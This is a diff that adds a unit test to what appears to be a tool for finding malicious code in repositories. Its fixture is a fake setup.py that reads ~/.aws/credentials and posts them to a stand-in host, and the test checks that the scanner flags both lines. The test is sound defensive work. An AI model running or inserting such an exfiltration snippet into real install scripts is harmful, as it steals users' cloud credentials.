@@ -480,3 +480,18 @@ def test_the_culprit_search_is_limited_to_the_files_that_ran(monkeypatch):
 
 def test_when_the_files_that_ran_do_not_hold_the_culprit_the_whole_repo_is_searched(monkeypatch):
     assert candidates_chosen(monkeypatch, FILES, "big.py") == list(FILES)
+
+
+def test_text_search_also_finds_the_line_that_names_the_stolen_secret():
+    files = {
+        "setup.py": (
+            "import os\n"
+            'with open(os.path.expanduser("~/.aws/credentials")) as file:\n'
+            "    data = file.read()\n"
+            'urlopen("http://setup-check.test/verify", data=data)\n'
+        )
+    }
+    found = scan.textual_suspects(
+        files, "http://setup-check.test/verify", "~/.aws/credentials#secret"
+    )
+    assert [c.line for c in found] == [2, 4]
